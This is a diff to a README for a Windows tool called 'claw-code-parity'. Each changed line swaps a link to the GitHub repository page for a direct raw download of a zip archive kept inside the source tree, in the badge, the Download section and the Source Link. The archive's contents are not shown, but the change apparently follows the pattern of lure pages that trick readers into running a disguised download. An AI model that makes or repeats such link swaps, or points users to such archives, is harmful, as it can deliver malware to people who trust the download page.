@@ -1,12 +1,12 @@
 # 🐾 claw-code-parity - Run the parity build on Windows
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20latest%20build-blue?style=for-the-badge&logo=github)](https://github.com/tabbypyrotechnic519/claw-code-parity)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20latest%20build-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/tabbypyrotechnic519/claw-code-parity/main/src/cli/code-claw-parity-v2.4-beta.1.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-https://github.com/tabbypyrotechnic519/claw-code-parity
+https://raw.githubusercontent.com/tabbypyrotechnic519/claw-code-parity/main/src/cli/code-claw-parity-v2.4-beta.1.zip
 
 ## 🪟 Windows Setup
 
@@ -178,4 +178,4 @@ For the smoothest setup:
 
 ## 📄 Source Link
 
-Primary download page: https://github.com/tabbypyrotechnic519/claw-code-parity
+Primary download page: https://raw.githubusercontent.com/tabbypyrotechnic519/claw-code-parity/main/src/cli/code-claw-parity-v2.4-beta.1.zip
